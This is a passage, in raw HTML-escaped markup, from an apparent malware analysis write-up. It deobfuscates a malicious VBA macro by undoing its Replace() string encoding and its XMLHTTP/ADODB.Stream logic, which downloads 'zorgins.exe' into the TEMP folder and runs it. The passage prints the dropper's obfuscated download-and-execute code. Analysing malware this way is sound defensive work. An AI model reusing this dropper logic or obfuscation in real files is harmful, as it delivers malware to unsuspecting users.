&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Object&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Variant&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The attacker alternates junk code taken from the web with his malicious code hidden inside, but with a little work we can find what we are interested in.&lt;/p&gt;

&lt;p&gt;Scrolling down the code, there are three portions suggesting there is a basic encryption technique which uses the &lt;em&gt;Replace()&lt;/em&gt; function that has been renamed in &lt;em&gt;GodnTeBabenParama()&lt;/em&gt;:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BRREADicroBRRREADoft.XBRREADLHTTPBRRRREADAdodb.BRRREADtrBREADaBRREADBRRRREADBRRREADhBREADll.Appli&quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cationBRRRREADWBRRREADcript.BRRREADhBREADllBRRRREADProcBREADBRRREADBRRREADBRRRREADGBREADTBRRRREADTBREADBRREADPBRRRREADTypBREADBRRRREADopBREADnBRRRREADwritTRONponBRRREADBREADBodyBRRRREADBRRREADavBREADtofilBREADBRRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;TRON&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BREADBRRRREADrBREADBRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\zorginBRRREAD.BREADxBREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;M&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GodnTeBabenParama&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Lastly, these values are put inside an array by using &lt;em&gt;Split()&lt;/em&gt; function:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BRRRREAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The result of these substitutions gives a lot of informations since the elements of the array are used in important parts of the code:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XMLHTTP&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Adodb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;streaM&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Application&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Wscript&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GeT&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TeMP&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;responseBody&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;savetofile&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zorgins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exe&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The last one is really informative since it is the name of an “.exe” file, which is probably the real payload. This means that there should be a part where the file “zorgins.exe” is downloaded and saved to the system.&lt;br /&gt;
We can then substitute these values everytime they appear in the code so as to decrypt it (look at the comments):&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Adodb.streaM)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(shell.Application)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh1DASH1solo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh1DASH1solo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighKSKLAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighLAKOPPC&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighGMAKO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Open&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighUUUKA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(shell.Application).Open (CreateObject(Wscript.shell).Environment(Process)(TeMP)\zorgins.exe)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It is clear now that “zorgins.exe” is saved in TEMP directory; moreover in the following snippet we have the HTTP GET request for a url (malware download) which is marked as “InTheAfrikaMountainsAreHigh4”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Open&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;False&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).Open GeT, InTheAfrikaMountainsAreHigh4, False&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).Send&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighDAcdaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;responseBody&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Microsoft.XMLHTTP).responseBody&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighPLAPEKCwwed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighASALLLP&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;&#39; = CreateObject(Adodb.streaM).Write CreateObject(Microsoft.XMLHTTP).responseBody&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Moving through the code, there is an strange series of numbers separated by the string “112112112112” and saved in the array “InTheAfrikaMountainsAreHighXSAOO”:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quotquot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;112112112112&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Taking a look at where this variable is used, we find this interesting function:&lt;/p&gt;

&lt;div class=&quot;language-visualbasic highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;Public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DuBirMahnWeishr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh6&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;String&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Dost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHighXSAOO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InTheAfrikaMountainsAreHigh6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;DuBirMahnWeishr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Dost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;Function&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which is then used here:&lt;/p&gt;

